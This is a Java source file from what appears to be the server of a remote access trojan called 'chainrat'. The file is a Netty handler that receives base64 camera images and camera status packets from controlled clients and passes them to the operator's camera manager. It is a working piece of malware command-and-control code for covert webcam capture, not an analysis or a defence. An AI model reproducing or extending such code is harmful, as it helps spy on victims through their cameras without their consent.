package com.nefi.chainrat.server.network.ControlServer.CommandHandler;

import com.nefi.chainrat.server.Main;
import com.nefi.chainrat.server.forms.frmMainController;
import com.nefi.chainrat.server.network.ControlServer.CommandType;
import com.nefi.chainrat.server.network.ControlServer.packets.CameraResponse;
import com.nefi.chainrat.server.network.ControlServer.packets.Packet;
import io.netty.channel.ChannelHandlerContext;
import io.netty.channel.ChannelInboundHandlerAdapter;

public class CameraResponseHandler extends ChannelInboundHandlerAdapter {

    @Override
    public void channelRead(ChannelHandlerContext ctx, Object msg) {
        //String went through JSON Serializer first
        System.out.println("[CameraResponseHandler]");
        Packet packet = (Packet) msg;

        if(packet.type == CommandType.IMAGE){
            String b64 = packet.content;
            frmMainController.getCameraManager().onImageReceived(b64);
            return;
        }
        else if (packet.type == CommandType.CAMERA_RESPONSE) {
            String json = packet.content;
            CameraResponse cr = (CameraResponse) Main.deserialize(json, CameraResponse.class);
            frmMainController.getCameraManager().onInfoReceived(cr);
            return;
        }
        ctx.fireChannelRead(msg);
    }

    @Override
    public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {

        cause.printStackTrace();
        ctx.close();
    }
}